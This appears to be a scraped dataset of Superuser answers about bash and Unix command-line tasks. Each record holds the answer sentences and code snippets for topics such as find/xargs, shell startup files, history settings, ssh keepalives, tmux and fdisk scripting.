45,https://superuser.com/questions109537/,"['The following command will list directories first, ordinary files second, and links third.', 'ls -la | grep ""^d"" && ls -la | grep ""^-"" && ls -la | grep ""^l""', 'Also, it would make a great deal of sense to create an alias for this command to save keystrokes.', 'Edit:', 'If you want directories first, and then everything that is not a directory second, use this:', 'ls -la | grep ""^d"" && ls -la | grep -v ""^d""']","[<code>ls -la | grep ""^d"" &amp;&amp; ls -la | grep ""^-"" &amp;&amp; ls -la | grep ""^l""</code>, <code>ls -la | grep ""^d"" &amp;&amp; ls -la | grep -v ""^d""</code>]"
46,https://superuser.com/questions614526/,"[""That's because you're feeding grep a stream of text which just happens to contain filenames. Since you provided no filenames as arguments to grep, it cannot be expected to deduce what file a matched line came from. Use xargs:"", 'Since you have GNU find/xargs, this is a safer way for xargs to read filenames:', 'If you only want the filenames that have a matching line without showing the matching line:']","[<code>grep</code>, <code>xargs</code>, <code>find . -type f -print | xargs grep ""some string""
</code>, <code>find . -type f -print0 | xargs -0 grep ""some string""
</code>, <code>find . -type f -print0 | xargs -0 grep -l ""some string""
</code>]"
47,https://superuser.com/questions152794/,"[""I'm no Linux/bash expert, but try putting this in your .bashrc."", 'PS Thanks to Dennis for using command mkdir.']","[<code>.bashrc</code>, <code>function mkdir
{
  command mkdir $1 &amp;&amp; cd $1
}
</code>, <code>command mkdir</code>]"
48,https://superuser.com/questions244964/,"['In OSX, .bash_profile is used instead of .bashrc.', 'And yes, the .bash_profile file should be located in /Users/YourName/\n(In other words, ~/.bash_profile)', 'For example, /Users/Aaron/.bash_profile']","[<code>.bash_profile</code>, <code>.bashrc</code>, <code>.bash_profile</code>, <code>/Users/YourName/</code>, <code>~/.bash_profile</code>, <code>/Users/Aaron/.bash_profile</code>]"
49,https://superuser.com/questions119179/,"['To change a shell, use the bare chsh command.  This will prompt you for the new shell.  You do not have to run anything as root.']",[<code>chsh</code>]
50,https://superuser.com/questions435988/,"[""Usually that error message means Linux doesn't recognize the file as a shell script or as an executable file.  "", 'Typically the cause is running an executable on the wrong architecture - if you try to run x86 executables on an ARM CPU, this message comes up.', 'Did /usr/bin/id get overwritten, possibly?']",[<code>/usr/bin/id</code>]
51,https://superuser.com/questions247770/,"['You can press Ctrl-Alt-e to perform the readline function shell-expand-line which will do alias, history and word expansions. Note that on some keyboards Meta is not Alt. You might need to press Esc then Ctrl-e', 'The functions alias-expand-line and history-and-alias-expand-line are not bound by default, but you can bind them by adding lines similar to the following to your ~/.inputrc file.', 'which would make Ctrl-Alt-l (lower case ""ell"") perform only alias expansion.']","[<code>shell-expand-line</code>, <code>alias-expand-line</code>, <code>history-and-alias-expand-line</code>, <code>~/.inputrc</code>, <code>""\e\C-l"": alias-expand-line
</code>]"
52,https://superuser.com/questions363444/,"['$() preserves the exit status; you just have to use it in a statement that has no status of its own, such as an assignment.', 'After this, $? would contain the exit status of inner, and you can use all sorts of checks for it:', 'Or:', 'Or:', ""(Note: A bare exit without arguments is equivalent to exit $? – that is, it exits with the last command's exit status. I used the second form only for clarity.)"", 'Also, for the record: source is completely unrelated in this case. You can just define inner() in the outer-scope.sh file, with the same results.']","[<code>$()</code>, <code>$?</code>, <code>inner</code>, <code>output=$(inner) || exit $?
echo $output
</code>, <code>if ! output=$(inner); then
    exit $?
fi
echo $output
</code>, <code>if output=$(inner); then
    echo $output
else
    exit $?
fi
</code>, <code>exit</code>, <code>exit $?</code>, <code>source</code>, <code>inner()</code>, <code>outer-scope.sh</code>]"
53,https://superuser.com/questions233616/,"['Use find and its -size flag. ', 'To find files larger than 100MB:', 'If you want the current dir only:']","[<code>-size</code>, <code>find . -type f -size +100M
</code>, <code>find . -maxdepth 1 -type f -size +100M
</code>]"
54,https://superuser.com/questions31744/,"['I installed git using MacPorts on my new Snow Leopard installation.  After MacPorts is installed from the .dmg image, these would be the commands in Terminal.app:', 'If you also want support for pulling from SVN repositories and docs, use this instead of the second line:', 'Then add the following to your ~/.profile or ~/.bash_profile:', 'or for MacPorts since version 2.1.2 on Mountain Lion:', 'or for MacPorts with newer versions of git:', ""Note: bash 4.1 or higher is required by bash_completion.sh. If completion doesn't work try echo $BASH_VERSION to see if that's the issue. If so, enter MacPorts bash by typing bash and try git completion again.""]","[<code>sudo port selfupdate
sudo port install git-core +bash_completion
</code>, <code>sudo port install git-core +bash_completion +doc +svn
</code>, <code>echo $BASH_VERSION</code>, <code>bash</code>]"
55,https://superuser.com/questions147043/,"[""So turns out that on Mac OS X Snow Leopard as well as Mac OS X Lion, the file that's loaded is called .profile, not .bashrc."", ""What you want to do is create a file in ~/.profile and call it .profile (if it doesn't already exists)."", 'Put whatever information you needed to load with each instance of bash there (Thanks, thepurplepixel).', 'A couple of side notes:', ""Edit: Chris Page notes (correctly) that whatever you place in a .profile file will apply to whatever shell you're using (i.e. zhs, bash, et cetera). If you want the contents to affect only the bash shell, place the contents in a .bash_profile file instead of a .profile file.""]","[<code>.profile</code>, <code>.bashrc</code>, <code>~/.profile</code>, <code>-a</code>, <code>ls -a</code>, <code>~</code>, <code>/Users/YourUserName</code>, <code>.bash_profile</code>, <code>.profile</code>]"
56,https://superuser.com/questions395668/,"[""That's what echo -n is for .""]",[<code>echo -n</code>]
57,https://superuser.com/questions422459/,"[""When you don't need the power of regular expressions, don't use it. That is fine.\nBut, this is not really a regular expression. "", ""So, if / is your problem, use | and you don't need to escape the former."", 'PS: About the comments, also see this Stackoverflow answer on Escape a string for sed search pattern.', 'Update: If you are fine using Perl try it with \\Q and \\E like this,  ', '@RedGrittyBrick has also suggested a similar trick with stronger Perl syntax in a comment here or here']","[<code>sed 's|literal_pattern|replacement_string|g'
</code>, <code>/</code>, <code>|</code>, <code>\Q</code>, <code>\E</code>, <code> perl -pe 's|\Qliteral_pattern\E|replacement_string|g'
</code>]"
58,https://superuser.com/questions137438/,"['Add this to your .bashrc (Linux) or .bash_profile (MacOS):', 'There you go, unlimited history. Currently I have 27000 entries :)', 'From man bash:', 'If HISTFILESIZE is not set, no truncation is performed.', 'That means .bash_history is never truncated', ""Also the same seems to apply to HISTSIZE, although I couldn't find that documented."", ""Another neat feature I'm going to try is this:"", 'If the HISTTIMEFORMAT variable is set, time stamps are written to the history file, marked with the history comment character, so they may be preserved across shell sessions, like the following:', 'Let me know if you have tried that already...']","[<code>.bashrc</code>, <code>.bash_profile</code>, <code>export HISTFILESIZE=
export HISTSIZE=
</code>, <code>man bash</code>, <code>HISTFILESIZE</code>, <code>.bash_history</code>, <code>HISTSIZE</code>, <code>HISTTIMEFORMAT</code>, <code>export HISTTIMEFORMAT=""%F %T ""
</code>]"
59,https://superuser.com/questions186272/,"[""It looks like you're doing option handling in a shell script.  Here's the idiom for that:"", '(There are a couple of conventions for indenting the ;;, and some shells allow you to give the options as (--opt1), to help with brace matching, but this is the basic idea)']","[<code>#! /bin/sh -

# idiomatic parameter and option handling in sh
while test $# -gt 0
do
    case ""$1"" in
        --opt1) echo ""option 1""
            ;;
        --opt2) echo ""option 2""
            ;;
        --*) echo ""bad option $1""
            ;;
        *) echo ""argument $1""
            ;;
    esac
    shift
done

exit 0
</code>, <code>;;</code>, <code>(--opt1)</code>]"
60,https://superuser.com/questions86340/,[],"[<code>adrian@Fourier:~$ printf 'HelloWorld\n%.0s' {1..5}
HelloWorld
HelloWorld
HelloWorld
HelloWorld
HelloWorld
adrian@Fourier:~$
</code>]"
61,https://superuser.com/questions169195/,"[""You will get that message if, for any reason, tar can't add all of the specified files to the tar.  One if the most common is not having read permission on one of the files.  This could be a big problem since you are using this for backup.  If you are using the -v flag, try leaving it off.  This should reduce the output and let you see what is going on.""]",[<code>-v</code>]
62,https://superuser.com/questions1107618/,"['Taken from this website:', 'The WSL has access to your PC’s file system through /mnt/<drive letter>/ directories (or mount points). For example, your C:\\ and D:\\ root directories in Windows would be available through /mnt/c/ and /mnt/d/ respectively in the WSL', ""Just cd into the /mnt folder and you'll be fine""]","[<code>/mnt/&lt;drive letter&gt;/</code>, <code>C:\</code>, <code>D:\</code>, <code>/mnt/c/</code>, <code>/mnt/d/</code>, <code>cd</code>, <code>/mnt</code>]"
63,https://superuser.com/questions1053633/,"[""You are correct, Git Bash for Windows is not just bash compiled for Windows. It's package that contains bash (which is a command-line shell) and a collection of other, separate *nix utilities like ssh, scp, cat, find and others (which you run using the shell), compiled for Windows, and a new command-line interface terminal window called mintty."", ""On Windows you might run commands like ipconfig /all or format G: using cmd.exe. These commands are actual executable files under C:\\Windows\\system32, stored as ipconfig.exe and format.com files. cmd.exe is separate from both and loads and runs them on user's request."", 'ssh, scp, cat, find are run using bash in exactly the same way. They are usually stored under /usr/bin rather than in C:\\Windows\\system32 on *nix systems, because Windows and *nix have their system file structure organised differently.', 'In the case of Git Bash for Windows these programs are located in the Git installation folder: C:\\Program Files\\Git\\usr\\bin, which can also be found in the emulated Linux environment under /usr/bin.', ""Just like being able to just run cmd.exe on *nix doesn't allow you to do much without the other system utilities, just being able to run Bash on Windows is not very useful either. This means that all these extra commands have to be bundled together with Bash to create a usable software package."", 'Normally those extra commands would be found on *nix systems and not on Windows, because they have been programmed against the POSIX programming API (which is what *nix uses), and not the Win32 APIs (which is what Windows uses). POSIX API documentation is openly available, so some people have ported it to other systems, including Windows. Windows implementation of POSIX APIs/libraries are provided by Cygwin and MSYS.', 'This is kind of similar to what the Wine project does, but it converts POSIX->Windows rather than Windows->POSIX like Wine does.', 'mintty is included because cmd.exe, the default Windows command line window, is missing some important features which are normally available on most *nix systems. In most cases, mintty is a better choice for running commands (certainly for the utilities that come with the Git Bash for Windows package), but occasionally a Windows system application may work better with cmd.exe.']","[<code>bash</code>, <code>bash</code>, <code>ssh</code>, <code>scp</code>, <code>cat</code>, <code>find</code>, <code>mintty</code>, <code>ipconfig /all</code>, <code>format G:</code>, <code>cmd.exe</code>, <code>C:\Windows\system32</code>, <code>ipconfig.exe</code>, <code>format.com</code>, <code>cmd.exe</code>, <code>ssh</code>, <code>scp</code>, <code>cat</code>, <code>find</code>, <code>bash</code>, <code>/usr/bin</code>, <code>C:\Windows\system32</code>, <code>C:\Program Files\Git\usr\bin</code>, <code>/usr/bin</code>, <code>cmd.exe</code>, <code>Cygwin</code>, <code>MSYS</code>, <code>mintty</code>, <code>cmd.exe</code>, <code>mintty</code>, <code>cmd.exe</code>]"
64,https://superuser.com/questions396536/,"[""NR (number of records) variable is records number of lines because default behavior is new line for RS (record seperator). pattern and action is optional in awk's default format 'pattern {actions}'. when we give only pattern part then awk writes all the fields $0 for our pattern's true conditions.  ""]","[<code>~ $ awk 'NR == 1 || NR % 3 == 0' yourfile
Line 1
Line 3
Line 6
</code>, <code>NR</code>, <code>RS</code>, <code>'pattern {actions}'</code>, <code>awk</code>, <code>$0</code>, <code>true</code>]"
65,https://superuser.com/questions222395/,"['-r = recursive, copies all the sub-directories', '-f = force, if an existing destination file cannot be opened, remove it and try again', 'Note You should be careful when using the -f flag because it will forcefully overwrite anything you copy to. Thank @Nifle for this suggestion.', 'You may want to use the * wildcard to copy all of the files in the directory if you need to.']","[<code>cp -rf /source/path/ /destination/path/
</code>, <code>-r</code>, <code>-f</code>, <code>-f</code>]"
66,https://superuser.com/questions1184384/,"['You can avoid POSIX compliant systems interpreting dashes in commands by adding -- before any arguments.', ""This also works with other utilities, let's say you have a file named -bla. If you try to remove it with rm you will get the following error:"", 'By using -- before the filename, you will remove the file:']","[<code>--</code>, <code>mtak@frisbee:~$ alias grep=grep --color=always
mtak@frisbee:~$ alias | grep color
alias --color='always'

mtak@frisbee:~$ unalias -- --color
mtak@frisbee:~$ alias | grep color
mtak@frisbee:~$
</code>, <code>-bla</code>, <code>rm</code>, <code>mtak@frisbee:~$ ls -- -bla
-bla
mtak@frisbee:~$ rm -bla
rm: invalid option -- 'b'
Try 'rm ./-bla' to remove the file '-bla'.
Try 'rm --help' for more information.
</code>, <code>--</code>, <code>mtak@frisbee:~$ rm -- -bla
mtak@frisbee:~$ ls -- -bla
ls: cannot access '-bla': No such file or directory
</code>]"
67,https://superuser.com/questions1342489/,"['No. >> is essentially ""always seek to end of file"" while > maintains a pointer to the last written location.', '(Note: all my tests done on Debian GNU/Linux 9).', 'No, they are not equivalent. There is another difference. It may manifest itself regardless of whether the target file existed before or not.', 'To observe it, run a process that generates data and redirect to a file with > or >> (e.g. pv -L 10k /dev/urandom > blob). Let it run and change the size of the file (e.g. with truncate). You will see that > keeps its (growing) offset while >> always appends to the end.', 'Another example is to append (with a separate >>) something extra when the data generating process is running and writing to the file. This is similar to enlarging the file.', 'Does it matter in practice? There is this question:', ""I'm running a process which produces a lot of output on stdout. Sending it all to a file [...] Can I use some kind of log rotation program?"", 'This answer says the solution is logrotate with copytruncate option which acts like this:', 'Truncate the original log file in place after creating a copy, instead of moving the old log file and optionally creating a new one.', 'According to what I wrote above, redirecting with > will make the truncated log large in no time. Sparseness will save the day, no significant disk space should be wasted. Nevertheless each consecutive log will have more and more leading zeros in it that are completely unnecessary.', ""But if logrotate creates copies without preserving sparseness, these leading zeros will need more and more disk space every time a copy is made. I haven't investigated the tool behavior, it may be smart enough with sparseness or compression on the fly (if compression is enabled). Still the zeros may only cause trouble or be neutral at best; nothing good in them."", 'In this case using >> instead of > is significantly better, even if the target file is about to be created yet.', ""As we can see, the two operators act differently not only when they begin but also later. This may cause some (subtle?) performance difference. For now I have no meaningful test results to support or disprove it, but I think you shouldn't  automatically assume their performance is the same in general.""]","[<code>&gt;&gt;</code>, <code>&gt;</code>, <code>&gt;</code>, <code>&gt;&gt;</code>, <code>pv -L 10k /dev/urandom &gt; blob</code>, <code>truncate</code>, <code>&gt;</code>, <code>&gt;&gt;</code>, <code>&gt;</code>, <code>&gt;&gt;</code>, <code>&gt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;</code>, <code>&gt;</code>, <code>&gt;&gt;</code>, <code>logrotate</code>, <code>copytruncate</code>, <code>&gt;</code>, <code>logrotate</code>, <code>&gt;&gt;</code>, <code>&gt;</code>]"
68,https://superuser.com/questions334827/,"['if you have zip,', ""Don't need to tar them first.""]","[<code>zip myzip.zip cvd*.txt
</code>, <code>tar</code>]"
69,https://superuser.com/questions1108090/,"['The Windows Subsystem for Linux (WSL) installation should automatically set the Ubuntu locale to match the locale of your Windows install.  You can change the Ubuntu locale manually using the shell.', 'Run this command in bash.exe to change the language to US English:', 'If you get a sudo: unable to resolve host error whenever you run sudo,', 'Verify that you have a hostname set (with the hostname command).', 'Edit the file with sudoedit /etc/hostname\n(assuming you can get that to work); see this.', 'See Error message when I run sudo: unable to resolve host\nfor more information.', ""If that doesn't fix it, try restarting the service:"", 'If you want to learn more about the bash in WSL,\nyou can read the FAQ by Microsoft.']","[<code>sudo update-locale LANG=en_US.UTF8
</code>, <code>sudo: unable to resolve host</code>, <code>sudo</code>, <code>hostname</code>, <code>/etc/hostname</code>, <code>/etc/hostname</code>, <code>sudoedit /etc/hostname</code>, <code>/etc/hosts</code>, <code>localhost</code>, <code>sudoedit</code>, <code>bash.exe</code>, <code>sc stop  lxssmanager
sc start lxssmanager
</code>]"
70,https://superuser.com/questions699676/,"['To make it clear: I am looking for a solution that I start once after logging in, and then I want to use that terminal, walk away, come back two hours later and continue working, without typing anything before walking away.', 'The problem is that there is something (usually a firewall or load-balancer), which is dropping idle sessions.  If you configure session keepalives, the keepalives will prevent network devices from considering the session as idle.', 'Linux / Unix / Cygwin OpenSSH fix:\nThe simplest fix is to enable ssh client keepalives; this example will send an ssh keepalive every 60 seconds:', 'If you want to enable this on all your sessions, put this in your /etc/ssh/ssh_config or ~/.ssh/config:', 'For more information, see the ssh_config manpage', 'Putty Fix:', 'Save this to your PuTTY ""Default Settings""...', '']","[<code>ssh -o ""ServerAliveInterval 60"" &lt;SERVER_ADDRESS&gt;
</code>, <code>/etc/ssh/ssh_config</code>, <code>~/.ssh/config</code>, <code>ServerAliveInterval 60
</code>, <code>ssh_config</code>]"
71,https://superuser.com/questions414965/,"[""Given a problem that both can handle, you'll want to use the one you're most comfortable with. Ultimately, there are a lot of small details, and only experience can teach you to see them."", 'Bash is a general purpose scripting language just like Python, Ruby, Perl, but each has different strengths over the rest. Perl excells at text analysis, Python claims to be the most elegant of the bunch, Bash scripts are excellent at ""piping stuff around"", if you know what I mean, and Ruby... well, Ruby is a little special in a lot of ways.', 'However, the differences between them only really matter once you have a healthy amount of scripting experience under your belt. I suggest you pick one language and push it to it\'s limits before moving to the next. You can do a lot in a shell script, more than most people would admit. Any language is just as hard as you want to make it. After you\'ve written a couple things in it, every language is ""easy"" to you.', 'Being familiar with the shell pays off quickly if you live in Linux, so maybe you want to start with that. If you find a task you that is impossible or impractical to solve in a shell script, use something else.', 'Also, bear in mind that learning shell scripting is very simple. The real power of it lies in other programs, like awk, sed, tr, et al.']",[]
72,https://superuser.com/questions849413/,"['You typically cat /dev/null > [something] when you want to wipe file contents while ensuring there is absolutely zero risk of interruption to the actual file state. The contents of the file will clearly be wiped by the cat /dev/null yet the file itself—as it exists and is known to the file system it resides on—will still be there with the same inode number, ownership and permissions.', 'In the case of a log file, it could be that the log file itself is marked “in use” by another process. So doing—for example—an rm /var/log/messages && touch /var/log/messages would be disruptive to other processes and might cause running processes to choke. Meaning a process that somehow is locked to a specific inode number connected to the file /var/log/messages could suddenly panic and say,\xa0“Hey! What happened to /var/log/messages!” even if the file is still there. Not to mention potential issues with ownership and permissions being incorrectly recreated.', 'Because of this uncertainty in usage/state of a file the use of cat /dev/null > [something] is preferred by system admins who want to clear out a log but do not want to potentially interfere with the operation of already existing processes.', 'Also, in the context of the page you link to the author states the following:', 'There is nothing unusual here, only a set of commands that could just\n  as easily have been invoked one by one from the command-line on the\n  console or in a terminal window. The advantages of placing the\n  commands in a script go far beyond not having to retype them time and\n  again.', 'So the “nothing unusual” the author mentions is with regards to the whole concept of what that specific bash script is: It’s just a set of simple commands that can just as easily be run from the command line but are placed in a text file to avoid having to retype them over and over again.']","[<code>cat /dev/null &gt; [something]</code>, <code>cat /dev/null</code>, <code>rm /var/log/messages &amp;&amp; touch /var/log/messages</code>, <code>/var/log/messages</code>, <code>/var/log/messages</code>, <code>cat /dev/null &gt; [something]</code>]"
73,https://superuser.com/questions490983/,"[""hash -r is what needs to be done. In zsh it is rehash and rehash doesn't exist (by default) in bash.""]",[<code>hash -r</code>]
74,https://superuser.com/questions538061/,"[""Homebrew is open source, so you can read its code to find out how it shows the icon. The line they're using is in the file formula_installer.rb:"", 'The first character in the print command is a ""🍺"", or unicode #1f37a \'BEER MUG\'.', '', ""So it's not an icon but an funny unicode beer mug :)""]","[<code>formula_installer.rb</code>, <code>print ""🍺  "" if MacOS.version &gt;= :lion
</code>, <code>print</code>, <code>🍺</code>]"
75,https://superuser.com/questions362235/,"[""Don't use double quotes."", ""sort -t $'\\t'"", 'Or I think Ctrl V inserts a Tab??', 'Edit:', 'http://www.gnu.org/s/bash/manual/html_node/ANSI_002dC-Quoting.html#ANSI_002dC-Quoting']",[<code>sort -t $'\t'</code>]
76,https://superuser.com/questions173209/,"['Try this:', 'That will suppress the progress meter, send stdout to /dev/null and redirect stderr (the -v output) to stdout.']","[<code>curl -vs -o /dev/null http://somehost/somepage 2&gt;&amp;1
</code>, <code>stdout</code>, <code>/dev/null</code>, <code>stderr</code>, <code>-v</code>, <code>stdout</code>]"
77,https://superuser.com/questions183876/,"['ls is actually separate from Bash. Mac OS X has a BSD version of ls, which requires -G on the command line, or CLICOLOR (and perhaps LSCOLORS) in the environment.', 'See man ls for more info.']","[<code>ls</code>, <code>ls</code>, <code>-G</code>, <code>CLICOLOR</code>, <code>LSCOLORS</code>, <code>man ls</code>]"
78,https://superuser.com/questions231881/,"['There is pushd and popd', 'Bash will keep a history of the directories you visit, you just have to ask.\n  Bash stores the history in a stack and uses the commands pushd\n  and popd to manage the stack.', 'More to read', 'Example:']","[<code>pushd</code>, <code>popd</code>, <code>$ pwd; pushd /tmp; pwd; popd; pwd
/home/me
/tmp ~
/tmp
~
/home/me
</code>]"
79,https://superuser.com/questions404135/,"['groupmod should work fine:', 'Use it like this:']","[<code>groupmod</code>, <code>$ groupmod --help
Usage: groupmod [options] GROUP

Options:
  -g, --gid GID                 change the group ID to GID
  -h, --help                    display this help message and exit
  -n, --new-name NEW_GROUP      change the name to NEW_GROUP
  -o, --non-unique              allow to use a duplicate (non-unique) GID
  -p, --password PASSWORD       change the password to this (encrypted)
                                PASSWORD
</code>, <code>groupmod --new-name NEW_GROUP_NAME OLD_GROUP_NAME
</code>]"
80,https://superuser.com/questions314239/,"['This will concatenate two mp3 files, and the resulting metadata will be that of the first file:', 'This is because, for ffmpeg, the whole ""concat:"" part is a single ""input file"", and its metadata will be of the first concatenated file. If you want to use metadata from the second file instead, you have to add it as a dummy input file and map its metadata to that of the output:', ""If you want to construct your metadata from the two metadatas, you'll have to do it by hand. You can dump a file's metadata with"", 'After dumping both metadatas and constructing new metadata, you can add it to the output file with -metadata, and you can disable metadata copying by setting a -map_metadata mapping from a negative input file number. This sets a name value and no other metadata:']","[<code>ffmpeg -i ""concat:file1.mp3|file2.mp3"" -acodec copy output.mp3
</code>, <code>ffmpeg -i ""concat:file1.mp3|file2.mp3"" -i file2.mp3 -acodec copy test.mp3 -map_metadata 0:1
</code>, <code>ffmpeg -i file1.mp3 -f ffmetadata file1.metadata
</code>, <code>-metadata</code>, <code>-map_metadata</code>, <code>ffmpeg -i ""concat:file1.mp3|file2.mp3"" -acodec copy -metadata ""title=Some Song"" test.mp3 -map_metadata 0:-1
</code>]"
81,https://superuser.com/questions336275/,"['One of the most basic tools to be used for that is probably id.', 'Which produces']","[<code>id</code>, <code>#!/bin/bash
if id ""$1"" &gt;/dev/null 2&gt;&amp;1; then
        echo ""user exists""
else
        echo ""user does not exist""
fi
</code>, <code>$ ./userexists root
user exists
$ ./userexists alice
user does not exist
$ ./userexists
user does not exist
</code>]"
82,https://superuser.com/questions332252/,"[""Similar to the previous suggestions, piping commands to fidsk,  I've found this approach useful to leave details for subsequent maintainers. The sed bits strip off all the comments before fdisk gets the input.""]","[<code># to create the partitions programatically (rather than manually)
# we're going to simulate the manual input to fdisk
# The sed script strips off all the comments so that we can 
# document what we're doing in-line with the actual commands
# Note that a blank line (commented as ""defualt"" will send a empty
# line terminated with a newline to take the fdisk default.
sed -e 's/\s*\([\+0-9a-zA-Z]*\).*/\1/' &lt;&lt; EOF | fdisk ${TGTDEV}
  o # clear the in memory partition table
  n # new partition
  p # primary partition
  1 # partition number 1
    # default - start at beginning of disk 
  +100M # 100 MB boot parttion
  n # new partition
  p # primary partition
  2 # partion number 2
    # default, start immediately after preceding partition
    # default, extend partition to end of disk
  a # make a partition bootable
  1 # bootable partition is partition 1 -- /dev/sda1
  p # print the in-memory partition table
  w # write the partition table
  q # and we're done
EOF
</code>]"
83,https://superuser.com/questions79972/,"['Depends on your shell.', 'This article displays multiple methods.', 'I personally use zsh which has a convenient precmd() function which is run before each prompt.', 'Although the other questions list bash methods, they alias cd.  Bash provides an inherent method that chains off just the prompt.', 'bash', 'bash supplies a variable PROMPT_COMMAND which contains a command to execute before the prompt. This example (inserted in ~/.bashrc) sets the title to ""username@hostname: directory"":', 'where \\033 is the character code for ESC, and \\007 for BEL. Note that the quoting is important here: variables are expanded in ""..."", and not expanded in \'...\'. So PROMPT_COMMAND is set to an unexpanded value, but the variables inside ""..."" are expanded when PROMPT_COMMAND is used.', ""However, PWD produces the full directory path. If we want to use the '~' shorthand we need to embed the escape string in the prompt, which allows us to take advantage of the following prompt expansions provided by the shell:"", 'Thus, the following produces a prompt of ""bash$ "", and an xterm title of ""username@hostname: directory"" ...', 'Note the use of [...], which tells bash to ignore the non-printing control characters when calculating the width of the prompt. Otherwise line editing commands get confused while placing the cursor. ']","[<code>    precmd () { print -Pn ""\e]2;%n@%M | %~\a"" } # title bar prompt
</code>, <code> PROMPT_COMMAND='echo -ne ""\033]0;${USER}@${HOSTNAME}: ${PWD}\007""'
</code>, <code>\u          expands to $USERNAME
\h          expands to hostname up to first '.'
\w          expands to directory, replacing $HOME with '~'
\[...\]     embeds a sequence of non-printing characters
</code>, <code> case $TERM in
     xterm*)
        PS1=""\[\033]0;\u@\h: \w\007\]bash\$ ""
        ;;
     *)
        PS1=""bash\$ ""
        ;;
 esac
</code>]"
84,https://superuser.com/questions320065/,"['Bash will source EITHER .bash_profile or .bashrc, depending upon how it is called. If it is a login shell, Bash looks for ~/.bash_profile, ~/.bash_login, or ~/.profile, in that order, and sources the first one it finds (and only that one). If it is not a login shell but is interactive (like most terminal sessions), Bash will source ~/.bashrc.', ""Likely, iTerm is looking for ~/.bashrc. If it's configured to start as a login shell, it will look for ~/.bash_profile. It's almost certainly an error within the config file rather than that the shell is not sourcing it."", 'I would put a line at the beginning of each file. At the top of ~/.bash_profile:', 'And at the top of ~/.bashrc:', 'Then, open a new iTerm and type', 'That should confirm the file is being sourced and you can look into the syntax of the file.']","[<code>export BASH_CONF=""bash_profile""
</code>, <code>export BASH_CONF=""bashrc""
</code>, <code>$ echo $BASH_CONF
</code>]"
85,https://superuser.com/questions596712/,"['Simply use brace expansion:', 'This is equivalent to writing:', 'Brace expansion lets you supply more arguments, of course. You can even pass ranges to it, e.g. to create a couple of test folders, you can run mkdir test_{a..z}, and starting with Bash 4, you can create zero-padded sequences as well, as in touch foo{0001..3}, which creates foo0001, foo0002 and foo0003. The Bash Hackers Wiki has an article with a couple of examples for you.', ""If you have to use two different commands, use a subshell and cd there first, as in @Ignacio's answer.""]","[<code>mv /folder1/folder2/folder3/{file.txt,file-2013.txt}
</code>, <code>mv /folder1/folder2/folder3/file.txt /folder1/folder2/folder3/file-2013.txt
</code>, <code>mkdir test_{a..z}</code>, <code>touch foo{0001..3}</code>, <code>foo0001</code>, <code>foo0002</code>, <code>foo0003</code>, <code>cd</code>]"
86,https://superuser.com/questions1169664/,"['You would write it as such:', 'Note that this could also be written (as suggested by @glennjackman):']","[<code>if [ -f ""/usr/bin/wine"" ]; then export WINEARCH=win32; fi
</code>, <code>[ -f ""/usr/bin/wine"" ] &amp;&amp; export WINEARCH=win32
</code>]"
87,https://superuser.com/questions125469/,"['The right command is', ""It isn't documented in the man page or the --help screen. I has to use strings to find it.""]","[<code>watch --color ""ls -a1 --color""
</code>]"
88,https://superuser.com/questions361902/,"['This creates an infinite loop, executing command over and over again.']","[<code>command</code>, <code>while :
do
    command
done
</code>]"
89,https://superuser.com/questions177445/,['From the CUPS manual.'],"[<code>$ lpstat -p -d
</code>]"
90,https://superuser.com/questions1504530/,"['As described here you can use', ""in fact, as @JoL suggests, you don't even need the --noprofile, since when ssh executes bash as just another command, it's not considered a login shell. Running ssh -t user@host bash will only read the RC files; and running ssh -t user@host bash --norc will not read even those.""]","[<code>ssh -t user@host bash --noprofile
</code>, <code>--noprofile</code>, <code>ssh -t user@host bash</code>, <code>ssh -t user@host bash --norc</code>]"
91,https://superuser.com/questions492266/,"['Each tmux pane is an interface for a single pty (pseudo tty). Non-split windows have a single pane; split windows have multiple panes.', 'tmux does not supply a way to add extra processes to a pane once it has been started with its initial command. It is up to that initial command’s process (usually a shell) to supply job control1 for that terminal.', ""If you want to clobber whatever is currently running in the pane, you can use respawn-pane -k to kill the existing command and replace it with a new one (e.g., respawn-pane -t sessionname:0.4 -k 'some -new command')."", 'But, if you want to maintain whatever is currently running in the pane, then there may be no better option that simply “typing at it” with send-keys.', 'You might script it like this (attach last, because otherwise the script will just wait for you to detach before continuing):', 'Note that, on the send-keys command, you should actually type the letters\nE n t e r,\nto tell tmux to send a newline key to the window.\xa0\n(Naturally, every command ends with the Enter key.)', '1Job control is the arbitration between multiple process groups of a single session that uses the tty as its controlling terminal. I.e., the Ctrl+Z suspend key, and the jobs, fg, and bg shell commands.']","[<code>respawn-pane -k</code>, <code>respawn-pane -t sessionname:0.4 -k 'some -new command'</code>, <code>send-keys</code>, <code>session=whatever
window=${session}:0
pane=${window}.4
tmux send-keys -t ""$pane"" C-z 'some -new command' Enter
tmux select-pane -t ""$pane""
tmux select-window -t ""$window""
tmux attach-session -t ""$session""
</code>, <code>send-keys</code>, <code>tmux</code>, <code>jobs</code>, <code>fg</code>, <code>bg</code>]"
92,https://superuser.com/questions18988/,"['export propagates the variable to subprocesses.', 'For example, if you did ', ""then a subprocess that checked for FOO wouldn't find the variable whereas"", 'would allow the subprocess to find it.', 'But if FOO has already been defined as an environment variable, then FOO=bar will modify the value of that environment variable.', 'For example:', ""Older shells didn't support the export FOO=bar syntax; you had to write FOO=bar; export FOO.""]","[<code>export</code>, <code>FOO=bar
</code>, <code>export FOO=bar
</code>, <code>FOO</code>, <code>FOO=bar</code>, <code>FOO=one     # Not an environment variable
export FOO  # Now FOO is an environment variable
FOO=two     # Update the environment variable, so sub processes will see $FOO = ""two""
</code>, <code>export FOO=bar</code>, <code>FOO=bar; export FOO</code>]"
93,https://superuser.com/questions156582/,"[""You answered correctly your own question, that's exactly why dot isn't in the path:\nTo protect against childish viruses or honest mistakes."", 'Of course, this is a very lame and useless anti-virus measure, and nothing stops you from adding dot to the path yourself.']",[]
